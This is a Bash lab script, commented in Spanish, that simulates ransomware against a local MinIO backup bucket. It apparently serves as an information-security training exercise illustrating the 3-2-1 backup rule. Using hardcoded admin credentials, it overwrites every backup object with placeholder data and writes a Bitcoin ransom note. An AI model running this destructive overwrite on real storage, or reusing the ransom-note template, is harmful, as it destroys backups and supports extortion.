#!/bin/bash
# simulate-ransomware.sh — Simula ransomware sobre Minio
# Uso: ./scripts/simulate-ransomware.sh

set -e

LAB_DIR="/home/kali/SGSI/lab"
EVID_DIR="/home/kali/SGSI/lab/evidencias/attacks/ransomware"
mkdir -p "$EVID_DIR"

echo "========================================="
echo " Simulación Ransomware — Minio (IF-06)"
echo " Fecha: $(date '+%Y-%m-%d %H:%M:%S')"
echo "========================================="

MC_CMD="docker run --rm --network host --entrypoint /bin/sh minio/mc:latest -c"
MC_SET="mc alias set local http://localhost:9000 minio_admin 'M1n10_B4ckupS_Str0ng_'"

# Verificar que existe el bucket
if $MC_CMD "$MC_SET && mc ls local/backups/ 2>/dev/null | grep -q odoo"; then
    echo ">>> Bucket backups encontrado"
else
    echo ">>> Creando datos de muestra en backups..."
    $MC_CMD "$MC_SET && echo 'Sample backup data: odoo_db 2026-07-18' | mc pipe local/backups/odoo/odoo_db.sql"
    $MC_CMD "$MC_SET && echo 'Sample backup data: cctv_config' | mc pipe local/backups/odoo/cctv_config.tar.gz"
    $MC_CMD "$MC_SET && echo 'Sample backup data: ldap_export' | mc pipe local/backups/ldap_users.ldif"
fi

# Simular cifrado de objetos
echo ">>> Ejecutando cifrado ransomware simulado..."
$MC_CMD "$MC_SET && mc ls local/backups/ --recursive --json 2>/dev/null" > /tmp/ransom_ls.json 2>/dev/null || true
python3 -c "
import sys, json
with open('/tmp/ransom_ls.json') as f:
    for line in f:
        line = line.strip()
        if not line: continue
        try:
            d = json.loads(line)
            if 'key' in d:
                print(d['key'])
        except:
            pass
" > /tmp/ransom_keys.txt

BACKUP_COUNT=0
while IFS= read -r obj; do
    [ -z "$obj" ] && continue
    echo "  Cifrando: $obj"
    $MC_CMD "$MC_SET && echo 'CIFRADO-RANSOMWARE-$(date +%s)' | mc pipe \"local/backups/$obj\"" 2>/dev/null
    BACKUP_COUNT=$((BACKUP_COUNT + 1))
done < /tmp/ransom_keys.txt

# Nota de rescate
echo "=== NOTA DE RESCATE ===" > /tmp/ransom_note.txt
echo "Sus archivos han sido cifrados con AES-256." >> /tmp/ransom_note.txt
echo "Para recuperarlos, transfiera 5 BTC a la dirección:" >> /tmp/ransom_note.txt
echo "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" >> /tmp/ransom_note.txt
date >> /tmp/ransom_note.txt
$MC_CMD "$MC_SET && echo 'Sus archivos han sido cifrados con AES-256. Para recuperarlos, transfiera 5 BTC a la direccion 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' | mc pipe local/backups/RESCATE_LEEME.txt" 2>/dev/null

echo ""
echo ">>> RESULTADO: $BACKUP_COUNT objetos cifrados"
echo "  $BACKUP_COUNT objetos comprometidos" > "$EVID_DIR/objetos-cifrados.txt"
echo "  Fecha: $(date '+%Y-%m-%d %H:%M:%S')" >> "$EVID_DIR/objetos-cifrados.txt"

echo ""
echo ">>> Iniciando recuperación desde copia externa..."
echo "  (Simulado: no hay copia externa — regla 3-2-1)"

echo "========================================="
echo " Ransomware completado"
echo " Objetos cifrados: $BACKUP_COUNT"
echo " Evidencias: $EVID_DIR/"
echo "========================================="
